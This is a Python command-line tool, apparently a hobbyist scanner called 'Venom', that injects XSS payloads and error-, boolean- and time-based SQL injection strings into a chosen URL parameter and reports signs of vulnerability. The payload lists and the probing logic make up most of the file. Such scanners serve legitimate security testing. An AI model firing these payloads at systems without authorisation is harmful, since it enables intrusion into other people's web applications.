import argparse
import requests
import urllib.parse

banner = '''
 ██▒   █▓▓█████  ███▄    █  ▒█████   ███▄ ▄███▓
▓██░   █▒▓█   ▀  ██ ▀█   █ ▒██▒  ██▒▓██▒▀█▀ ██▒
 ▓██  █▒░▒███   ▓██  ▀█ ██▒▒██░  ██▒▓██    ▓██░
  ▒██ █░░▒▓█  ▄ ▓██▒  ▐▌██▒▒██   ██░▒██    ▒██ 
   ▒▀█░  ░▒████▒▒██░   ▓██░░ ████▓▒░▒██▒   ░██▒
   ░ ▐░  ░░ ▒░ ░░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░ ▒░   ░  ░
   ░ ░░   ░ ░  ░░ ░░   ░ ▒░  ░ ▒ ▒░ ░  ░      ░
     ░░     ░      ░   ░ ░ ░ ░ ░ ▒  ░      ░   
      ░     ░  ░         ░     ░ ░         ░   
     ░                                         
'''

print(banner)

def send_payload(url, param, payload):
   parsed = urllib.parse.urlparse(url)
   query = urllib.parse.parse_qs(parsed.query)
   query[param] = payload
   q = urllib.parse.urlencode(query, doseq=True)

   new_parsed = parsed._replace(query=q)
   final = urllib.parse.urlunparse(new_parsed)

   res = requests.get(final, timeout=10)

   return res

def xss(url, param):
   payloads = [
    '<script>alert("venom")</script>',      
    '<img src=x onerror=alert("venom")>',   
    '"><script>alert("venom")</script>',    
    '<svg onload=alert("venom")>',          
    "'><script>alert(\"venom\")</script>" 
]
   
   found = False
   for i in payloads:
      res = send_payload(url, param, i)
   
      if i in res.text:
         print(f'\033[32m[+] {i} XSS Detected [+]\033[0m')
         found = True

   if not found:
        print('\033[31m[-] No Reflection, Not Vulnerable to XSS [-]\033[0m')

def error_based(url, param):
    payloads = ["'",            
    '"',            
    "`",            
    "')",           
    "';",           
    "'--",          
    "' OR '1'='1",  
    "1'",          
    "\\",           
    "'||'"]
    errors = ['sql syntax', 'mysql', 'you have an error', 'unclosed quotation', 'ora-', 'sqlite', 'syntax error', 'odbc', 'psql']

    found = False

    for i in payloads:
        res = send_payload(url, param, i)

        if any(e in res.text.lower() for e in errors):
            print(f'\033[32m[+] Error Based SQLi Detected: {i} [+]\033[0m')
            found = True
    if not found:
        print('\033[31m[-] No SQLi Vulnerabilities Detected [-]\033[0m')

def bool_based(url, param):
    true_payload  = "' OR '1'='1"
    false_payload = "' AND '1'='2"
    true_res  = send_payload(url, param, true_payload)
    false_res = send_payload(url, param, false_payload)
    # compare — simplest is response length
    if len(true_res.text) != len(false_res.text):
        print('\033[32m[+] Boolean-based SQLi Detected [+]\033[0m')
    else:
        print('\033[31m[-] No boolean difference [-]\033[0m')

def time_based(url, param): 
    payload = "' OR sleep(3);-- -"

    res = send_payload(url, param, payload)
    time = res.elapsed.total_seconds()

    if time >= 3:
        print('\033[32m[+] Time-based SQLi Detected [+]\033[0m')
    else:
        print('\033[31m[-] No Time Based Detected [-]\033[0m')


def sqli(url, param):
    error_based(url, param)
    bool_based(url, param)
    time_based(url, param)

def credits():
    print('''\033[31m
            %%%%%%%%%&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&@@@@@@@
            %%%%%%%%%%%%%%%%%%&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
            %%%%%%%%%%%%%%%%%%%%%%%%%%%%&&&&&&%&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
            %%%%%%%%%%%#*,,(////((%%%%#/((((#(*((/((((###%%%%%&%%%%&%%%%%%&&&&&&&&&&&&&&&&&&
            ##((((#(((((((((/******///((((/(((((/(///(/(/(/(#%%%%%#%#%%%%%%%%%%%%%&&&&&&&&&&
            ((,,,****,*,**,***,,,,,*/**////(((//////////(((//*//****///,(#%%%%%%%%%%%%%%&&&&
            #((((#####(///***,,,,,,...,,.*//.,******/////,,,***,**,..,,.//((#####%%%%%%%%%%%
            ####(((###(((***,**,,,******,,....,.,,.,/(##%%%%%&&&%%%%%%##(/*,..,,,*/**/**/%%%
            ##########((/*//((///((/*,,,.,*,...,(%%%%%%%%%%%%%%%%%&&&&%%%%%%%#(*,**,,,,,,(##
            ((//((####(//(////////(((/////*,*#%%%%%%%&&&&%%%#%##%%&&&&&&%%%%%%%%(*,..,.,/((/
            ((#(((/(#(///**//**//**//*(((//#%%%%%%%&&&&&&&&&@&&&&&&&&&&&&&%%%%%%%%#*,,,,*//,
            (##(#((####(((///(((((/(((((((#%%%%&&&&&&&&&&@@@@@@@@@@@@@&&&&&&&%%%%%%#/*///**,
            %%%%%#%%%#%#####%%####((#((((#%%&&&&&&&&&@@@@@@@@@@@@@@@@@@@&&&&&&&&%%%%(****/((
            %%%###(**#%%%%%%%%%%%%%%%%%%##%&&&@@@@@@@@@@@@@@@@@@@@@@@@@@@@&&&&&&&&%%#(##(#/*
            #%%%#%#(#%%%%#%%%%%%&%%%%%%%##%&&&&@@@@&&&&%&&&&&&&&&&&@@@@@@@@@&&&&&&&%##%##%#(
            #############(###############&&@@@@&&%%%%%%%%%#%%%&&&%%%%&&&&@@@&&&&&&&%#%%%%%%#
            ##############(((((((((((#%&@@@@@&%%%%&&@@@&%#%%%%%%%%%%%%%%%%&&&&&&&&&%#%%%%%%%
            #########((((((((((((((%&@@@@@@@%%##%&@&&@@&&###%%%%%%#%&@@@@&%%&&@@@&&%########
            #######((((((((((((((#&&@@@@@@@&%%%%%%%&&&&%%%###%%#%%%&@@@@@&%%%&&&@@@&%#(#####
            ##########(((##(((##%&@@@@@@@@&&%%%%%%%%%#%%%##%%%%%%%%&&&@@@&%%%%&&@@@&&%######
            ################(#&&@@@@@@@@@&&&&%%%##########%%%%%#%%%%%%%%%%%%%%&&@@@@@&%#####
            ################&&@@@@@@@@@@@&&&%%%%%#(###%#%%%%%&%%%%%%%%%%%%%%%&&@@@@@@&&%####
            ##############%&@@@@@@@@@@@@&%%%%%%%######%%%%%%%%%%%%%%%%%%%%%&&&&@@@@@@@&&%###
            #############%&@@@@@@@@@@@@@@&&%%%%%%%%##%%%%%%%%%%%%%%%%%%%%%&&&&@@@@@@@@@&%%##
            #############&&@@@@@@@@@@@@@&&%%%%%%&%%%%%%%%%%%%%%%%%%%%%%%%&&&&&&@@@@@@@@@&&%#
            %%%%%%%%%##%&&&@@@@@@@@@@&&&%%&%&&&&&&&&%%%%%%##%%%%%%%%%&&&&&&&&&@@@@@@@@@@@&%%
            %%%%%%%%%%%%%%&&@@@@@@@&&%%%%%%&%%%%&&&&&&&&&&&&&&&&&&&&&&&&&&&&@@@@@@@@@@@@@@&&\nDev: pr0lificz\033[0m''')

def help():
    print('Venom is an XSS and SQLi Vulnerability checker\n\nUsage:\npython3 venom.py <command> [options]\npython3 venom.py sqli -u "http://<ip-address>/?id=1" -p id\n\nCOMMANDS:\nsqli\nScan a parameter for SQL injection (error, boolean, time-based)\n\nxss\nScan a parameter for reflected XSS\n\ncredits\nShow credits\n\nhelp\nShow this help message')

parser = argparse.ArgumentParser(
    prog='venom',
    description='SQLi and XSS Vulnerability Check'
)

subparsers = parser.add_subparsers(dest='action', required=True)

global_flags = argparse.ArgumentParser(add_help=False)
global_flags.add_argument('-u', '--url', required=True, help='target URL')
global_flags.add_argument('-p', '--param', required=True, help='param to inject')

sqli_parser = subparsers.add_parser('sqli', parents=[global_flags], help='SQLi Vuln Scan')

xss_parser = subparsers.add_parser('xss', parents=[global_flags], help='XSS Vuln Scan')

credits_parser = subparsers.add_parser('credits', help='show credits')

help_parser = subparsers.add_parser('help', help='show help / usage')

args = parser.parse_args()

if args.action == 'sqli':
   sqli(args.url, args.param)   
elif args.action == 'xss':
    xss(args.url, args.param)
elif args.action == 'credits':
    credits()
elif args.action == 'help':
    help()